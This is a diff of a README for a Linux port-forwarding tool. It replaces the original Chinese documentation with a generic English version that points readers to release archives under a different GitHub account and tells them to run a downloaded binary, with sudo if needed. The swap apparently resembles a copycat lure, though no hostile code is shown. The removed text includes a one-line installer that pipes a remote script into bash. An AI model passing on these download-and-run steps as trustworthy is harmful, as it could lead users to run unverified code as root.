@@ -1,233 +1,69 @@
-# 🚀 端口转发管理工具 (Port Forward Manager)
-
-一款 Linux 端口转发管理工具，支持 8 种转发方案，自动安装依赖和优化网络性能。
-
-## 📋 更新日志
-
-### v1.0.1 (2026-01-01)
-- 🆕 新增 nftables DNAT 转发方案（现代 Linux 内核推荐）
-
-### v1.0.0
-- 初始版本发布
-- 支持 7 种转发方案
-
-## ✨ 特性
-
-- 🎯 **8 种转发方案** - nftables / iptables / HAProxy / socat / gost / realm / rinetd / nginx stream
-- 🔧 **自动部署** - 自动安装依赖、配置服务、优化内核
-- 📊 **实时状态** - 查看所有活跃转发规则和延迟检测
-- 📈 **流量统计** - nftables/iptables 规则支持流量统计
-- 🚄 **性能优化** - 自动启用 BBR、TCP Fast Open、大缓冲区等优化
-- 🔄 **多规则共存** - 不同转发方案可同时运行，互不影响
-- 💾 **配置备份** - 自动备份配置，支持快速恢复
-- 🎨 **友好界面** - 彩色交互式菜单，操作简单直观
-
-## 📋 支持系统
-
-- Debian 10/11/12 ✅
-- Ubuntu 20.04/22.04/24.04 ✅
-- CentOS 7 ⚠️ (基本支持，使用 yum)
-
-> 脚本主要在 Debian/Ubuntu 上测试，CentOS/RHEL 系列基本可用但部分依赖可能需要手动安装。
-
-## 🛠️ 安装
-
-### 一键安装
-
-```bash
-bash <(curl -sL https://raw.githubusercontent.com/Chil30/port-forward/main/port_forward.sh)
-```
-
-### 手动安装
-
-```bash
-# 下载脚本
-wget https://raw.githubusercontent.com/Chil30/port-forward/main/port_forward.sh
-
-# 添加执行权限
-chmod +x port_forward.sh
-
-# 运行脚本
-./port_forward.sh
-```
-
-首次运行会自动安装到 `/usr/local/bin/pf`，之后可直接使用 `pf` 命令。
-
-## 📖 使用方法
-
-### 启动工具
-
-```bash
-pf
-```
-
-### 主菜单
-
-```
-============================================================================
-                      端口转发管理工具 v1.0.1
-============================================================================
-  状态: 运行中    转发规则: 3 条
-  作者: Chil30    命令: pf
-  项目: https://github.com/Chil30/port-forward
-============================================================================
-
-  1) 配置新的端口转发
-  2) 查看当前转发状态
-  3) 查看运行日志
-  4) 停止转发服务
-  5) 查看备份文件
-  6) 流量统计
-  7) 卸载转发服务
-  0) 退出
-```
-
-### 转发方案对比
-
-| 方案 | 延迟 | 适用场景 | 特点 |
-|------|------|----------|------|
-| nftables DNAT | ⭐ 最低 | 游戏/RDP/VNC | 现代内核级转发，推荐 |
-| iptables DNAT | ⭐ 最低 | 游戏/RDP/VNC | 传统内核级转发 |
-| realm | ⭐⭐ 较低 | 高并发场景 | Rust 编写，高性能 |
-| HAProxy | ⭐⭐ 较低 | Web/负载均衡 | 功能丰富，支持健康检查 |
-| nginx stream | ⭐⭐ 较低 | Web/SSL | 与现有 nginx 集成 |
-| socat | ⭐⭐ 较低 | 通用转发 | 简单可靠 |
-| rinetd | ⭐⭐ 较低 | 多端口转发 | 配置简单 |
-| gost | ⭐⭐⭐ 中等 | 加密代理 | 支持多协议、加密 |
-
-**性能排序**: nftables/iptables > realm > HAProxy/nginx > socat/rinetd > gost
-
-**功能排序**: gost > nginx/HAProxy > realm > socat/rinetd > nftables/iptables
-
-### 配置示例
-
-1. 运行 `pf` 进入主菜单
-2. 选择 `1) 配置新的端口转发`
-3. 输入目标服务器 IP 和端口
-4. 输入本地监听端口
-5. 选择转发方案
-6. 确认配置开始部署
-
-```
-目标服务器IP/域名: 192.168.1.100
-目标端口 [3389]: 22
-本地监听端口 [22]: 33389
-请选择方案 [1]: 5
-
-配置确认：
-目标服务器: 192.168.1.100:22
-本地监听: 0.0.0.0:33389
-转发方案: realm
-
-确认配置并开始部署? [Y/n]: y
-```
-
-## 🔧 性能优化
-
-脚本会自动应用以下内核优化：
-
-- ✅ BBR 拥塞控制算法
-- ✅ TCP Fast Open (减少握手延迟)
-- ✅ 256MB 网络缓冲区
-- ✅ 早期重传机制
-- ✅ 瘦流优化
-- ✅ 禁用延迟 ACK
-- ✅ 连接跟踪优化
-
-## 📁 文件位置
-
-| 文件 | 路径 |
-|------|------|
-| 脚本命令 | `/usr/local/bin/pf` |
-| 配置备份 | `/root/.port_forward_backups/` |
-| nftables 备份 | `/root/.port_forward_nftables_running.txt` |
-| nftables 配置 | `/etc/nftables.d/port_forward.nft` |
-| iptables 备份 | `/root/.port_forward_iptables_running.txt` |
-| realm 配置 | `/etc/realm/config.toml` |
-| gost 配置 | `/etc/gost/config.json` |
-| HAProxy 配置 | `/etc/haproxy/haproxy.cfg` |
-| rinetd 配置 | `/etc/rinetd.conf` |
-| nginx stream | `/etc/nginx/stream.d/port-forward-*.conf` |
-
-## ❓ 常见问题
-
-### Q: nftables 和 iptables 有什么区别？
-
-A: nftables 是 iptables 的现代替代品，在较新的 Linux 内核（3.13+）中推荐使用。两者性能相近，但 nftables 语法更简洁、功能更强大。如果系统默认使用 nftables（如 Debian 10+），建议选择 nftables 方案。
-
-### Q: nftables/iptables 规则重启后丢失？
-
-A: 脚本会自动备份规则，可通过菜单 `4) 启动转发服务` 恢复。
-
-nftables 持久化：
-```bash
-# 规则会保存到 /etc/nftables.d/port_forward.nft
-systemctl enable nftables
-```
-
-iptables 持久化：
-```bash
-apt install iptables-persistent
-netfilter-persistent save
-```
-
-### Q: iptables 规则重启后丢失？
-
-A: 脚本会自动备份 iptables 规则到 `/root/.port_forward_iptables_running.txt`，可通过菜单 `4) 启动转发服务` 恢复。建议安装 `iptables-persistent` 实现持久化：
-
-```bash
-apt install iptables-persistent
-netfilter-persistent save
-```
-
-### Q: nginx stream 报错 "unknown directive stream"？
-
-A: Debian/Ubuntu 默认的 nginx 包不包含 stream 模块，脚本会自动安装 `nginx-full` 并加载模块。如果已有 nginx 运行，脚本会保留现有配置，只添加 stream 转发。
-
-### Q: 如何同时使用多种转发方案？
-
-A: 脚本支持多种方案共存。部署新方案时只会清理同类型的旧配置，不影响其他方案。例如可以同时运行 iptables 转发端口 A 和 realm 转发端口 B。
-
-### Q: rinetd 端口监听失败？
-
-A: 确保端口未被占用，脚本会自动处理 rinetd 服务重启。如仍有问题，尝试：
-
-```bash
-killall rinetd
-systemctl restart rinetd
-```
-
-### Q: 如何查看转发是否生效？
-
-A: 
-1. 使用菜单 `2) 查看当前转发状态` 查看所有活跃规则和延迟
-2. 使用 `telnet 本机IP 本地端口` 测试连接
-3. 使用 `ss -tlnp` 查看端口监听状态
-
-### Q: 如何完全卸载？
-
-A: 使用菜单 `7) 卸载转发服务`，选择 `9) 卸载所有服务`。这会停止所有服务、清理配置文件和防火墙规则。
-
-### Q: 转发延迟很高怎么办？
-
-A: 
-1. 优先使用 iptables DNAT 方案（内核级，延迟最低）
-2. 确认 BBR 已启用：`sysctl net.ipv4.tcp_congestion_control`
-3. 检查目标服务器网络质量
-
-## 🔗 相关链接
-
-- GitHub: https://github.com/Chil30/port-forward
-- Issues: https://github.com/Chil30/port-forward/issues
-
-## 📄 许可证
-
-MIT License
-
-## 🙏 致谢
-
-感谢以下开源项目：
-- [realm](https://github.com/zhboner/realm)
-- [gost](https://github.com/ginuerzh/gost)
-- [HAProxy](https://www.haproxy.org/)
-- [nginx](https://nginx.org/)
+# 🚀 port-forward - Easily Manage Port Forwarding
+
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20port--forward-blue.svg)](https://github.com/Amine123-fd/port-forward/releases)
+
+## 🚀 Getting Started
+This guide helps you download and run the port-forward application. This tool manages Linux port forwarding using several methods. You can deploy it with one click and enjoy features like auto kernel optimization and improved network performance.
+
+## 📋 Features
+- **Multiple Methods**: Supports iptables, HAProxy, socat, gost, realm, rinetd, and nginx.
+- **User-Friendly**: Designed for quick setup and user interaction through an easy command-line interface (CLI).
+- **Performance**: Optimizes your system automatically and enables BBR for better network speeds.
+
+## 🔍 System Requirements
+- **Operating System**: Linux (compatible with most distributions)
+- **Storage Space**: At least 50 MB of free space
+- **RAM**: Minimum 512 MB (1 GB recommended)
+- **Processor**: Any modern CPU should work
+
+## 💡 Installation Instructions
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/Amine123-fd/port-forward/releases) to find the latest version of port-forward. 
+
+2. **Download the Application**
+   On the Releases page, find the latest version. Click on the appropriate download link for your system. This will start downloading the .tar.gz file.
+
+3. **Extract the Files**
+   Once downloaded, navigate to your Downloads folder. Use the following command to extract the files (replace `filename` with the actual name of the downloaded file):
+   ```bash
+   tar -xzf filename.tar.gz
+   ```
+
+4. **Run the Application**
+   Change your directory to the extracted folder:
+   ```bash
+   cd port-forward
+   ```
+   Now, run the application with:
+   ```bash
+   ./port-forward
+   ```
+   Follow the prompts to set up your port forwarding.
+
+## 📥 Download & Install
+To get started, make sure you download the application from the Releases page. Use the following link to access it directly: [Download port-forward](https://github.com/Amine123-fd/port-forward/releases).
+
+## 🎛️ Configuration
+After starting the application, you will see the interactive CLI. Here’s a brief on how to configure your settings:
+
+- **Set Up Port Forwarding**: Choose the method you wish to use. Each method will have specific options for configuration. Follow the instructions prompted in the CLI.
+- **Advanced Options**: If you're familiar with networking, you can tweak advanced settings for maximum performance.
+
+## 🛠️ Troubleshooting
+If you encounter any issues:
+
+1. **Check Dependencies**: Ensure all required packages are installed.
+2. **Permission Issues**: Run the application with `sudo` if you face permission errors.
+3. **Network Configuration**: Verify your network settings if the port forwarding does not seem to work.
+
+## 🤝 Support
+If you need help, please submit an issue on the [GitHub Issues page](https://github.com/Amine123-fd/port-forward/issues). Keep your questions clear and provide details about your problem.
+
+## 📜 License
+This project is licensed under the MIT License. Feel free to customize and share.
+
+## 📣 Acknowledgements
+Thanks to everyone who contributed to making port-forward a powerful tool for Linux users. Your efforts are invaluable.
+
+To start using port-forward today, head straight to the [Releases page](https://github.com/Amine123-fd/port-forward/releases) to download and install this application.
